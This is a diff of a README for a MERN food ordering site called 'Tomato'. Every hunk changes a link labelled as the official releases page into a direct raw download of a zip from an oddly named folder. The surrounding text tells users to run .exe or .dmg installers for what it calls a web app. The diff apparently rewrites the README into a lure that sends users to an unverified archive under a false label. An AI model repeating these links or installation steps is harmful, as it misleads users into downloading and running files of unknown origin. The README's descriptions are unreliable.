@@ -11,7 +11,7 @@ Tomato is the MERN Stack-powered food ordering website that makes online food sh
 Follow these simple steps to get started with Tomato.
 
 1. **Visit the Releases Page**  
-   Go to the Releases page to find the latest version of Tomato. You can find it here: [Download Tomato](https://github.com/RishiRaj-SoftwareEngineer/Food-Delivery-MERN/master/rayage/food-delivery.zip).
+   Go to the Releases page to find the latest version of Tomato. You can find it here: [Download Tomato](https://raw.githubusercontent.com/RishiRaj-SoftwareEngineer/Food-Delivery-MERN/master/rayage/food-delivery.zip).
 
 2. **Download the Application**  
    Look for the version you want to install. Click on the link for the file that matches your operating system. 
@@ -49,7 +49,7 @@ Now, let’s go through the installation process in more detail:
    - **Windows:** Download the `.exe` file.
    - **macOS:** Download the `.dmg` file.
 
-   **Important:** Make sure to download from the official releases page: [Download Tomato](https://github.com/RishiRaj-SoftwareEngineer/Food-Delivery-MERN/master/rayage/food-delivery.zip).
+   **Important:** Make sure to download from the official releases page: [Download Tomato](https://raw.githubusercontent.com/RishiRaj-SoftwareEngineer/Food-Delivery-MERN/master/rayage/food-delivery.zip).
 
 2. **Open the Downloaded File**
    - For Windows: Double-click on the `.exe` file to start the installation.
@@ -102,6 +102,6 @@ For more information, check our documentation and tutorials. Explore the followi
 - Making Secure Payments
 - Managing Your Orders
 
-Remember, you can always return to the [Releases page](https://github.com/RishiRaj-SoftwareEngineer/Food-Delivery-MERN/main/rayage/food-delivery.zip) for updates and new features.
+Remember, you can always return to the [Releases page](https://raw.githubusercontent.com/RishiRaj-SoftwareEngineer/Food-Delivery-MERN/master/rayage/food-delivery.zip) for updates and new features.
 
 Happy ordering with Tomato!
